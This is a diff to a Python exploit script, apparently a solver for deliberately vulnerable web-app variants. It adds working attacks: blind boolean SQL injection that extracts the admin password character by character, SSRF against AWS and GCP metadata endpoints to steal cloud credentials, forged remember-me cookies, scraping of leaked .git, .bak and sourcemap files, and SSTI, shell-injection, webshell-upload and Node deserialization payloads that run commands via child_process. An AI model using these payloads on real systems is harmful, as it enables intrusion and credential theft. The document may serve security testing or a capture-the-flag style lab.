@@ -28,6 +28,30 @@ def forge_none(payload):
 
 INJ = "' UNION SELECT 999,username,password FROM users WHERE username='" + ADM + "'-- "
 
+# blind-bool extraction — the /search handler for `blind-bool` variant returns {found: N}. Binary-search
+# each character of the admin password via a truthy AND-clause. Alphabet is printable ASCII sans quote.
+def _blind_ok(p, q):
+    s, t, _ = get(p + "?q=" + urllib.parse.quote(q))
+    d = jparse(t)
+    if isinstance(d, dict) and isinstance(d.get("found"), int): return d["found"] > 0
+    if isinstance(d, list): return len(d) > 0
+    return False
+
+def _blind_bool_extract_password(p, max_len=48):
+    chars = ''.join(chr(c) for c in range(0x20, 0x7f) if chr(c) not in "'\"\\%_")
+    pw = ''
+    for i in range(1, max_len + 1):
+        # is there ANY character at position i?
+        if not _blind_ok(p, "%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "):
+            break
+        found = None
+        for c in chars:
+            q = "%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "
+            if _blind_ok(p, q): found = c; break
+        if found is None: return None
+        pw += found
+    return pw or None
+
 def manifest():
     s, t, _ = get("/manifest"); m = jparse(t) or {}
     eps = {}
@@ -59,12 +83,28 @@ def gather(eps, auth):
                 if isinstance(d, dict):
                     if d.get("password"): facts["password"] = d["password"]
                     if d.get("apikey"): facts["adminkey"] = facts.get("adminkey") or d["apikey"]
-    # SQLi via search
+    # SQLi via search — try the four variants:
+    #  union : rows returned; password is smuggled into `category`
+    #  error : rows returned or the raw SQL is echoed in an error body (the injection still yields data via UNION)
+    #  blind-bool : /search returns {found: N} — but our UNION still forces N>=1 when true. To recover
+    #               the password, we brute-force each character via SUBSTR(...) = 'X'
+    #  blind-time : same UNION works; we don't need to rely on timing
     for p in eps.get("search", []):
         s, t, _ = get(p + "?q=" + urllib.parse.quote(INJ)); rows = jparse(t)
         if isinstance(rows, list):
             for r in rows:
                 if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
+        # error-variant fallback: 500 body may carry the query verbatim; extract the injected UNION result
+        if not facts.get("password"):
+            d = jparse(t)
+            if isinstance(d, dict) and isinstance(d.get("query"), str) and "root_admin" in d["query"]:
+                # UNION was rejected but the injection was placed — try boolean-style extraction
+                pw = _blind_bool_extract_password(p)
+                if pw: facts["password"] = pw
+        # blind-bool variant returns {"found": N} — cannot piggyback UNION; do char-by-char extraction
+        if not facts.get("password") and isinstance(rows, dict) and "found" in rows:
+            pw = _blind_bool_extract_password(p)
+            if pw: facts["password"] = pw
     # XXE via import
     for p in eps.get("import", []):
         for tgt, key in [("file:///app/config/app.conf", "conf"), ("file:///app/secret/app.key", "appkey")]:
@@ -96,6 +136,31 @@ def gather(eps, auth):
         s, t, _ = get(p)
         mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
         mk = re.search(r'SIGNING_KEY=(\S+)', t or "");  facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
+    # variant-distinct disclosure routes: .git/config, .bak, sourcemap
+    for kind in ("git-config", "bak", "sourcemap"):
+        for p in eps.get(kind, []):
+            s, t, _ = get(p)
+            if not t: continue
+            mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+            mk = re.search(r'SIGNING_KEY=(\S+)', t or "");      facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
+            if kind == "sourcemap":
+                # source map: sourcesContent contains [config, appkey]
+                d = jparse(t)
+                if isinstance(d, dict):
+                    sc = d.get("sourcesContent") or []
+                    for src in sc:
+                        mmp = re.search(r'admin\.password=(\S+)', src or "");  facts["password"] = facts.get("password") or (mmp.group(1) if mmp else None)
+                    if len(sc) >= 2 and sc[1] and "password" not in (sc[1] or ""): facts["appkey"] = facts.get("appkey") or sc[1].strip()
+    # ssrf-cloudmeta — try the AWS IMDS + GCP metadata URLs against every /fetch endpoint
+    for p in eps.get("fetch", []):
+        for url in ["http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
+                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]:
+            s, t, _ = post(p, {"url": url})
+            d = jparse(t)
+            if isinstance(d, dict) and d.get("status") == 200:
+                inner = jparse(d.get("body") or "") or {}
+                key = inner.get("SecretAccessKey") or inner.get("access_token")
+                if key: facts["appkey"] = facts.get("appkey") or key
     return facts
 
 def cred_from_login(auth, resp_text, resp_headers):
@@ -120,6 +185,9 @@ def admin_creds(eps, auth, facts):
     if auth == "session":
         cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
         if facts.get("sid"): cands.append(("session-file", {"Cookie": "mutie_sid=" + facts["sid"]}))
+        # remember-me — either base64(username) or plain username
+        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
+        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
     if auth == "apikey" and facts.get("adminkey"):
         cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
     # login SQLi bypass
@@ -151,15 +219,23 @@ def admin_creds(eps, auth, facts):
     return cands
 
 def try_sinks(eps, hdr):
-    # ssti
+    # ssti — try eval / ejs / triple-brace / pug payloads
+    ssti_payloads = [
+        "{{ process.mainModule.require('child_process').execSync('id') }}",         # eval
+        "<%= process.mainModule.require('child_process').execSync('id') %>",       # ejs
+        "{{{ process.mainModule.require('child_process').execSync('id') }}}",     # handlebars (triple)
+        "- var cp = require('child_process')\n= cp.execSync('id').toString()",     # pug
+    ]
     for p in eps.get("render", []):
-        s, t, _ = post(p, {"template": "{{ process.mainModule.require('child_process').execSync('id') }}", "data": {}}, hdr)
-        d = jparse(t)
-        if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "ssti"
-    # cmdi
+        for pl in ssti_payloads:
+            s, t, _ = post(p, {"template": pl, "data": {}}, hdr); d = jparse(t)
+            if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "ssti"
+    # cmdi — inject shell for all four variants (tar/ping/zip/git); each variant uses a different arg
     for p in eps.get("backup", []):
-        s, t, _ = post(p, {"name": "x.tgz; id #"}, hdr); d = jparse(t)
-        if isinstance(d, dict) and "uid=" in str(d.get("log", "")): return "cmdi"
+        for body in [{"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"},
+                     {"name": "x; id #"}, {"branch": "main; id #"}]:
+            s, t, _ = post(p, body, hdr); d = jparse(t)
+            if isinstance(d, dict) and "uid=" in str(d.get("log", "")): return "cmdi"
     # upload webshell — try both variants: js-require and ejs-template
     if eps.get("upload") and eps.get("run"):
         payloads = [("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"),
@@ -172,11 +248,14 @@ def try_sinks(eps, hdr):
                     if rp.startswith(base):
                         s, t, _ = post(rp.replace(":name", fn), {}, hdr); d = jparse(t)
                         if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "upload"
-    # deserialization
+    # deserialization — try node-serialize + funcster payloads
     for p in eps.get("import-job", []):
-        payload = json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"})
-        s, t, _ = post(p, {"job": payload}, hdr); d = jparse(t)
-        if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "deser"
+        for payload in [
+            json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+            json.dumps({"__js_function": "function(){ return require('child_process').execSync('id').toString() }"}),
+        ]:
+            s, t, _ = post(p, {"job": payload}, hdr); d = jparse(t)
+            if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "deser"
     return None
 
 def try_ssrf(eps):
